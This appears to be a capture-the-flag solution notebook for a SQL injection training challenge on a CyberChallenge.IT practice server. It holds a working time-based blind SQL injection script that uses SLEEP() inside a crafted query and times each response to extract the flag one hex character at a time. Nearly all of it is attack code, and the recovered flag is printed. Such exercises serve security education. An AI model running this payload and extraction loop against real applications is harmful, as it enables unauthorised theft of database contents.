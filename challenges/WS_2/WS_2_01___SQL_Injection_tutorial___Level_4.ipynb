{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### WS_2.01 - SQL Injection tutorial - Level 4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "class Inj:\n",
    "    def __init__(self, host):\n",
    "        self.sess = requests.Session()\n",
    "        self.base_url = '{}/api/'.format(host)\n",
    "        self._refresh_csrf_token()\n",
    "    \n",
    "    def _refresh_csrf_token(self):\n",
    "        resp = self.sess.get(self.base_url + 'get_token')\n",
    "        resp = resp.json()\n",
    "        self.token = resp['token']\n",
    "    \n",
    "    def _do_raw_req(self, url, query):\n",
    "        headers = {'X-CSRFToken': self.token}\n",
    "        data = {'query': query }\n",
    "        return self.sess.post(url,json=data, headers=headers).json()\n",
    "\n",
    "    def logic(self, query):\n",
    "        url = self.base_url + 'logic'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']\n",
    "    \n",
    "    def union(self, query):\n",
    "        url = self.base_url + 'union'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']\n",
    "\n",
    "    def blind(self, query):\n",
    "        url = self.base_url + 'blind'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']\n",
    "\n",
    "    def time(self, query):\n",
    "        url = self.base_url + 'time'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'CCIT{Dont_trus7_tim3}'"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import time\n",
    "\n",
    "inj = Inj('http://sqlinjection.challs.cyberchallenge.it')\n",
    "payload = \"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{}%') = '1\"\n",
    "\n",
    "dictionary = '0123456789abcdef'\n",
    "flag = ''\n",
    "\n",
    "while True:\n",
    "    for character in dictionary:\n",
    "        question = payload.format(flag + character)\n",
    "        before_request = time.time()\n",
    "        response, error = inj.time(question)\n",
    "        total_time = time.time() - before_request\n",
    "\n",
    "        if total_time > 1:\n",
    "            flag += character\n",
    "            break\n",
    "    else:\n",
    "        break\n",
    "\n",
    "bytes.fromhex(flag).decode()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
